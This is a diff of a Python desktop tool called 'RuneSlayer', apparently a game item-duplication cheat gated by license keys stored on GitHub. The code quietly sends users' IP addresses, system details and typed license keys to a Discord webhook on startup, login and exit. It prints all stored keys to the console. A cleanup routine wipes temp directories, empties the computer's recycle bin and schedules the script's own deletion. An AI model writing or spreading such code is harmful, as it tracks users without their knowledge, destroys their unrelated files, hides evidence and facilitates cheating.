+                    relief=tk.FLAT,
+                    padx=20,
+                    pady=5,
+                    command=progress_window.destroy
+                )
+                close_button.pack(pady=(10, 0))
+                
+            except Exception as e:
+                # Show error if something goes wrong
+                update_progress(f"Error: {str(e)}", 0, 
+                               "An error occurred during the dupe process.\nPlease try again or contact support.")
+                
+                # Add a close button for the error state
+                close_button = tk.Button(
+                    progress_frame,
+                    text="Close",
+                    bg=self.current_colors["danger"],
+                    fg=self.current_colors["text_bright"],
+                    activebackground="#d04040",
+                    activeforeground=self.current_colors["text_bright"],
+                    relief=tk.FLAT,
+                    padx=20,
+                    pady=5,
+                    command=progress_window.destroy
+                )
+                close_button.pack(pady=(10, 0))
+        
+        # Start the dupe process in a separate thread to keep UI responsive
+        dupe_thread = threading.Thread(target=execute_dupe_process)
+        dupe_thread.daemon = True
+        dupe_thread.start()
 
 
 class AuthenticationApp:
@@ -1193,7 +1398,7 @@ class AuthenticationApp:
         self.root.geometry("500x300")
         self.root.minsize(500, 300)
         self.root.configure(bg=COLORS["background"])
-        
+
         # Center window
         self.root.update_idletasks()
         width = self.root.winfo_width()
@@ -1201,28 +1406,28 @@ class AuthenticationApp:
         x = (self.root.winfo_screenwidth() // 2) - (width // 2)
         y = (self.root.winfo_screenheight() // 2) - (height // 2)
         self.root.geometry(f'{width}x{height}+{x}+{y}')
-        
+
         # Variables
         self.auth_thread = None
         self.authenticated = False
         self.user_info = None
-        
+
         # Security tracking 
         self.failed_attempts = 0
         self.last_attempt_time = time.time()
-        
+
         # Store initialization time for session tracking
         self.root.setvar("_init_time", time.time())
-        
+
         # Setup UI
         self.setup_login_ui()
-    
+
     def setup_login_ui(self):
         """Set up the login UI"""
         # Main container
         self.login_frame = tk.Frame(self.root, bg=COLORS["background"])
         self.login_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
-        
+
         # Title
         title_label = tk.Label(
             self.login_frame,
@@ -1232,11 +1437,11 @@ class AuthenticationApp:
             fg=COLORS["text_bright"]
         )
         title_label.pack(pady=(0, 20))
-        
+
         # Login container
         login_container = tk.Frame(self.login_frame, bg=COLORS["background_secondary"], padx=30, pady=30)
         login_container.pack()
-        
+
         # Key input
         key_label = tk.Label(
             login_container,
@@ -1245,9 +1450,9 @@ class AuthenticationApp:
             fg=COLORS["text"]
         )
         key_label.pack(anchor=tk.W, pady=(0, 5))
-        
+
         self.key_var = tk.StringVar()
-        
+
         self.license_entry = tk.Entry(
             login_container,
             textvariable=self.key_var,
@@ -1260,7 +1465,7 @@ class AuthenticationApp:
             highlightthickness=1
         )
         self.license_entry.pack(pady=(0, 15))
-        
+
         # Login button
         self.login_button = tk.Button(
             login_container,
@@ -1275,7 +1480,7 @@ class AuthenticationApp:
             command=self.authenticate
         )
         self.login_button.pack(pady=(10, 0))
-        
+
         # Status message
         self.login_status_var = tk.StringVar()
         self.login_status_label = tk.Label(
@@ -1286,20 +1491,20 @@ class AuthenticationApp:
             wraplength=300
         )
         self.login_status_label.pack(pady=(15, 0))
-    
+
     def authenticate(self):
         """Authenticate user with license key"""
         license_key = self.key_var.get().strip()
-        
+
         if not license_key:
             self.login_status_var.set("Please enter a license key")
             return
-        
+
         # Show loading message
         self.login_status_var.set("Authenticating...")
         self.login_button.config(state=tk.DISABLED)
         self.root.update()
-        
+
         try:
             # Create authentication thread
             self.auth_thread = threading.Thread(target=self._authenticate_thread, args=(license_key,))
@@ -1308,19 +1513,19 @@ class AuthenticationApp:
         except Exception as e:
             self.login_status_var.set(f"Authentication error: {str(e)}")
             self.login_button.config(state=tk.NORMAL)
-    
+
     def get_sha_of_file(self):
         """Get the SHA of the keys file on GitHub (required for updating)"""
         api_url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{KEYS_FILE_PATH}"
         headers = {
             "Accept": "application/vnd.github.v3+json"
         }
-        
+
         try:
             print(f"Getting SHA from: {api_url}")
             response = requests.get(api_url, headers=headers)
             print(f"SHA response status: {response.status_code}")
-            
+
             if response.status_code == 200:
                 file_data = response.json()
                 sha = file_data.get('sha')
@@ -1336,41 +1541,41 @@ class AuthenticationApp:
         except Exception as e:
             print(f"Exception getting SHA: {str(e)}")
             return None
-    
+
     def update_keys_on_github(self, keys_data, sha):
         """Update the keys file on GitHub after using a key"""
         api_url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{KEYS_FILE_PATH}"
-        
+
         # Prepare the content for the file
         content = json.dumps(keys_data, indent=4)
-        
+
         # GitHub API requires Base64 encoded content
         encoded_content = base64.b64encode(content.encode("utf-8")).decode("utf-8")
-        
+
         # For public repositories, we still need a token to push changes
         # This will only work if you have write access to the repository
         headers = {
             "Accept": "application/vnd.github.v3+json"
         }
-        
+
         # Add token if available
         if GITHUB_TOKEN:
             headers["Authorization"] = f"token {GITHUB_TOKEN}"
             print("Using GitHub token for authentication when updating keys")
         else:
             print("Warning: No GitHub token available for updating keys")
-        
+
         data = {
             "message": "Update keys after authentication",
             "content": encoded_content,
             "sha": sha  # Use the retrieved SHA for the update
         }
-        
+
         try:
             print(f"Updating keys at: {api_url}")
             response = requests.put(api_url, json=data, headers=headers)
             print(f"Update response status: {response.status_code}")
-            
+
             if response.status_code in (200, 201):
                 print("Successfully updated keys.json on GitHub.")
                 return True
@@ -1380,26 +1585,26 @@ class AuthenticationApp:
         except Exception as e:
             print(f"Exception updating keys: {str(e)}")
             return False
-    
+
     def download_file_from_github(self, file_path):
         """Download a file from GitHub using raw URL for public repositories"""
         # Construct raw GitHub URL
         url = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/{file_path}"
         print(f"Downloading file from GitHub: {file_path}")
         print(f"Raw URL: {url}")
-        
+
         try:
             # Make the request
             print(f"Making request to GitHub raw URL...")
             response = requests.get(url)
             print(f"Response status code: {response.status_code}")
-            
+
             # Check for successful response
             if response.status_code == 200:
                 print("GitHub download successful")
                 content = response.content
                 print(f"Successfully downloaded content (length: {len(content)} bytes)")
-                
+
                 # Return content as string
                 return True, content.decode('utf-8')
             else:
@@ -1407,34 +1612,34 @@ class AuthenticationApp:
                 error_message = f"Failed to download file. Status code: {response.status_code}"
                 print(f"Download error: {error_message}")
                 return False, error_message
-        
+
         except Exception as e:
             # Handle exceptions
             return False, f"An error occurred: {str(e)}"
-    
+
     def _authenticate_thread(self, license_key):
         """Authentication process in a separate thread"""
         try:
             # Debug output
             print(f"Starting authentication with key: {license_key}")
-            
+
             # Download keys.json from GitHub
             success, result = self.download_file_from_github(KEYS_FILE_PATH)
-            
+
             if success:
                 # Parse the JSON data
                 keys_data = json.loads(result)
-                
+
                 # Check if key is valid
                 valid_key = False
                 key_info = None
                 key_index = -1
-                
+
                 # Print all available keys for debugging
                 print("Available keys in the database:")
                 for idx, key_entry in enumerate(keys_data.get("keys", [])):
                     print(f"  Key {idx+1}: {key_entry.get('key')} (Uses remaining: {key_entry.get('uses_remaining', 0)})")
-                    
+
                     if key_entry.get("key") == license_key:
                         print(f"Found matching key: {license_key}")
                         # Check uses remaining
@@ -1450,11 +1655,11 @@ class AuthenticationApp:
                             print("Key has no uses remaining")
                             self.root.after(0, lambda: self._update_auth_status(False, "License key has no uses remaining"))
                             return
-                
+
                 if valid_key:
                     # Get current HWID
                     current_hwid = str(uuid.getnode())  # MAC address as HWID
-                    
+
                     # Check if HWID is already set and matches (first ensure key_info is not None)
                     if key_info is not None:
                         stored_hwid = key_info.get("hwid")
@@ -1462,23 +1667,23 @@ class AuthenticationApp:
                             print(f"HWID mismatch: stored {stored_hwid}, current {current_hwid}")
                             self.root.after(0, lambda: self._update_auth_status(False, "HWID mismatch! License is bound to another system."))
                             return
-                    
+
                     # Authentication successful - continue
                     # Make sure key_info is not None
                     uses_remaining = 0
                     if key_info is not None:
                         uses_remaining = key_info.get("uses_remaining", 0)
-                    
+
                     # Decrement the uses for the key
                     updated_uses = uses_remaining - 1
                     print(f"Decrementing uses from {uses_remaining} to {updated_uses}")
-                    
+
                     self.user_info = {
                         "key": license_key,
                         "uses_remaining": updated_uses,
                         "hwid": current_hwid
                     }
-                    
+
                     # Update the key in GitHub if possible
                     sha = self.get_sha_of_file()
                     if sha:
@@ -1494,16 +1699,16 @@ class AuthenticationApp:
                                     keys_data["keys"][idx]["hwid"] = current_hwid
                                     print(f"Setting HWID for key: {current_hwid}")
                                 break
-                        
+
                         # Update the file on GitHub
                         update_success = self.update_keys_on_github(keys_data, sha)
                         print(f"GitHub update success: {update_success}")
-                        
+
                         if not update_success:
                             print("Failed to update key uses on GitHub")
                     else:
                         print("Failed to get SHA for GitHub update")
-                    
+
                     # Return successful authentication
                     self.root.after(0, lambda: self._update_auth_status(True, f"Authentication successful! Uses remaining: {updated_uses}"))
                     return
@@ -1516,24 +1721,24 @@ class AuthenticationApp:
                 error_msg = result if isinstance(result, str) else "Failed to access license database"
                 self.root.after(0, lambda: self._update_auth_status(False, f"Authentication error: {error_msg}"))
                 return
-            
+
         except Exception as e:
             self.root.after(0, lambda: self._update_auth_status(False, f"Authentication error: {str(e)}"))
-    
+
     def _update_auth_status(self, success, message):
         """Update authentication status on the main thread"""
         if success:
             # Reset failed attempts counter on successful login
             self.failed_attempts = 0
-            
+
             self.login_status_label.config(fg=COLORS["success"])
             self.login_status_var.set(message)
             self.authenticated = True
-            
+
             # Calculate session duration in seconds
             session_start_time = self.root.getvar("_init_time") if hasattr(self.root, "getvar") else time.time()
             login_duration = time.time() - session_start_time
-            
+
             # Log successful authentication to Discord webhook
             if hasattr(self, 'user_info') and self.user_info:
                 # Create fields with license info
@@ -1545,7 +1750,7 @@ class AuthenticationApp:
                     {"name": "IP Address", "value": get_ip_address(), "inline": True},
                     {"name": "System Info", "value": get_system_info(), "inline": False}
                 ]
-                
+
                 # Send webhook with success color (green)
                 send_discord_webhook(
                     title="✅ RuneSlayer Authentication Success",
@@ -1553,26 +1758,26 @@ class AuthenticationApp:
                     fields=license_fields,
                     color=0x43B581  # Green color
                 )
-            
+
             # Update the cooldown file to start the cooldown timer
             print("Authentication successful, updating cooldown file")
             update_cooldown_file()
-            
+
             # Wait a moment then start the main application
             self.root.after(1500, self.start_main_application)
         else:
             # Increment failed attempts counter
             self.failed_attempts += 1
-            
+
             # Track timing between attempts for brute force detection
             current_time = time.time()
             time_since_last_attempt = current_time - self.last_attempt_time
             self.last_attempt_time = current_time
-            
+
             self.login_status_label.config(fg=COLORS["danger"])
             self.login_status_var.set(message)
             self.login_button.config(state=tk.NORMAL)
-            
+
             # Log failed authentication to Discord webhook
             failed_fields = [
                 {"name": "Attempted Key", "value": self.license_entry.get() if hasattr(self, 'license_entry') else "Unknown", "inline": False},
@@ -1582,16 +1787,16 @@ class AuthenticationApp:
                 {"name": "IP Address", "value": get_ip_address(), "inline": True},
                 {"name": "System Info", "value": get_system_info(), "inline": False}
             ]
-            
+
             # Brute force detection
             title = "❌ RuneSlayer Authentication Failed"
             description = "A user failed to authenticate with RuneSlayer"
-            
+
             # If too many rapid attempts, add warning to title
             if self.failed_attempts >= 3 and time_since_last_attempt < 5:
                 title = "⚠️ POTENTIAL BRUTE FORCE ATTEMPT ⚠️"
                 description = f"Suspicious login activity detected! {self.failed_attempts} failed attempts in quick succession."
-            
+
             # Send webhook with error color (red)
             send_discord_webhook(
                 title=title,
@@ -1599,12 +1804,12 @@ class AuthenticationApp:
                 fields=failed_fields,
                 color=0xF04747  # Red color
             )
-    
+
     def start_main_application(self):
         """Start the main application after successful authentication"""
         # Destroy the login window
         self.login_frame.destroy()
-        
+
         # Create and show the main application
         main_app = RuneSlayerTool(self.root, self.user_info)
 
@@ -1613,30 +1818,30 @@ def secure_delete_file(file_path):
     """Securely delete a file by overwriting it with random data before deleting"""
     if not os.path.exists(file_path):
         return
-    
+
     try:
         # Get file size
         file_size = os.path.getsize(file_path)
-        
+
         # Open file for binary write
         with open(file_path, "wb") as f:
             # First pass: Overwrite with zeros
             f.write(b'\x00' * file_size)
             f.flush()
             os.fsync(f.fileno())
-            
+
             # Second pass: Overwrite with ones
             f.seek(0)
             f.write(b'\xFF' * file_size)
             f.flush()
             os.fsync(f.fileno())
-            
+
             # Third pass: Overwrite with random data
             f.seek(0)
             f.write(os.urandom(file_size))
             f.flush()
             os.fsync(f.fileno())
-        
+
         # Delete the file
         os.remove(file_path)
         print(f"Securely deleted file: {file_path}")
@@ -1709,7 +1914,7 @@ def empty_recycle_bin():
                                     shutil.rmtree(item_path, ignore_errors=True)
                                 else:
                                     secure_delete_file(item_path)
-                        
+
                         # Remove info files
                         info_dir = os.path.join(trash_dir, 'info')
                         if os.path.exists(info_dir):
@@ -1725,18 +1930,18 @@ def empty_recycle_bin():
 def perform_cleanup():
     """Perform all cleanup operations"""
     print("Starting secure cleanup...")
-    
+
     # Log application exit to Discord webhook
     try:
         import datetime
         import platform
-        
+
         exit_fields = [
             {"name": "Event Type", "value": "Application Exit", "inline": True},
             {"name": "Exit Time", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
             {"name": "Operating System", "value": f"{platform.system()} {platform.release()}", "inline": True}
         ]
-        
+
         # Send webhook
         send_discord_webhook(
             title="🚪 RuneSlayer Application Closed",
@@ -1746,17 +1951,17 @@ def perform_cleanup():
         )
     except Exception as e:
         print(f"Error sending exit webhook: {str(e)}")
-    
+
     # Get this script's path
     script_path = os.path.abspath(__file__)
     print(f"Script path: {script_path}")
-    
+
     # Clean up temp directories
     cleanup_temp_directories()
-    
+
     # Empty recycle bin
     empty_recycle_bin()
-    
+
     # Lastly, try to securely delete this script (may not work as it's running)
     try:
         # Set the script to delete on exit
@@ -1780,7 +1985,7 @@ def perform_cleanup():
             subprocess.Popen(f"nohup {shell_path} >/dev/null 2>&1 &", shell=True)
     except Exception as e:
         print(f"Error setting up self-deletion: {str(e)}")
-    
+
     print("Secure cleanup complete")
 
 # Register the cleanup function to run on exit only if we're running in a temporary process
@@ -1799,18 +2004,18 @@ def main(user_info=None):
             {"name": "Event Type", "value": "Application Startup", "inline": True},
             {"name": "Version", "value": "1.0", "inline": True}
         ]
-        
+
         # Add system info
         import platform
         import datetime
         os_info = f"{platform.system()} {platform.release()}"
         current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
+
         startup_fields.extend([
             {"name": "Operating System", "value": os_info, "inline": True},
             {"name": "Timestamp", "value": current_time, "inline": False}
         ])
-        
+
         # Send webhook
         send_discord_webhook(
             title="🚀 RuneSlayer Application Started",
@@ -1818,21 +2023,21 @@ def main(user_info=None):
             fields=startup_fields,
             color=0x5865F2  # Discord blue
         )
-        
+
         # Check for cooldown
         on_cooldown, remaining_minutes = is_on_cooldown()
         if on_cooldown:
             # Convert remaining minutes to minutes and seconds
             remaining_mins = int(remaining_minutes)
             remaining_secs = int((remaining_minutes - remaining_mins) * 60)
-            
+
             # Log cooldown encounter to Discord webhook
             cooldown_fields = [
                 {"name": "Event Type", "value": "Cooldown Encountered", "inline": True},
                 {"name": "Remaining Time", "value": f"{remaining_mins}m {remaining_secs}s", "inline": True},
                 {"name": "Timestamp", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False}
             ]
-            
+
             # Send webhook
             send_discord_webhook(
                 title="⏳ RuneSlayer Cooldown Active",
@@ -1840,14 +2045,14 @@ def main(user_info=None):
                 fields=cooldown_fields,
                 color=0xFAA61A  # Orange/warning color
             )
-            
+
             # Create a simple window to show cooldown message
             root = tk.Tk()
             root.title("RuneSlayer - Cooldown Active")
             root.geometry("450x200")
             root.configure(bg=COLORS["background"])
             root.resizable(False, False)
-            
+
             # Center window
             root.update_idletasks()
             width = root.winfo_width()
@@ -1855,11 +2060,11 @@ def main(user_info=None):
             x = (root.winfo_screenwidth() // 2) - (width // 2)
             y = (root.winfo_screenheight() // 2) - (height // 2)
             root.geometry(f'{width}x{height}+{x}+{y}')
-            
+
             # Message frame
             msg_frame = tk.Frame(root, bg=COLORS["background"])
             msg_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
-            
+
             # Icon/Warning
             warning_label = tk.Label(
                 msg_frame,
@@ -1869,7 +2074,7 @@ def main(user_info=None):
                 fg=COLORS["warning"]
             )
             warning_label.pack(pady=(0, 10))
-            
+
             # Title
             title_label = tk.Label(
                 msg_frame,
@@ -1879,7 +2084,7 @@ def main(user_info=None):
                 fg=COLORS["text_bright"]
             )
             title_label.pack(pady=(0, 10))
-            
+
             # Message
             message = f"Please wait {remaining_mins} minutes and {remaining_secs} seconds before using RuneSlayer again."
             message_label = tk.Label(
@@ -1891,7 +2096,7 @@ def main(user_info=None):
                 justify=tk.CENTER
             )
             message_label.pack(pady=(0, 15))
-            
+
             # Close button
             close_button = tk.Button(
                 msg_frame,
@@ -1906,18 +2111,18 @@ def main(user_info=None):
                 command=root.destroy
             )
             close_button.pack()
-            
+
             # Start mainloop
             root.mainloop()
             return
-        
+
         # Not on cooldown, create root window
         root = tk.Tk()
-        
+
         # Create custom style for ttk widgets
         style = ttk.Style()
         style.theme_use('default')
-        
+
         if user_info:
             # Skip auth and go straight to main app if user_info provided
             app = RuneSlayerTool(root, user_info)
@@ -1927,13 +2132,13 @@ def main(user_info=None):
             # Start with auth window if no user_info
             app = AuthenticationApp(root)
             # Authentication process will call update_cooldown_file after success
-        
+
         # Add handler for window close event to ensure cleanup occurs (if needed)
         if os.environ.get("RUNESLAYER_CLEANUP_ON_EXIT") == "1":
             root.protocol("WM_DELETE_WINDOW", lambda: (perform_cleanup(), root.destroy()))
         else:
             root.protocol("WM_DELETE_WINDOW", root.destroy)
-        
+
         # Start main loop
         root.mainloop()
     except Exception as e:
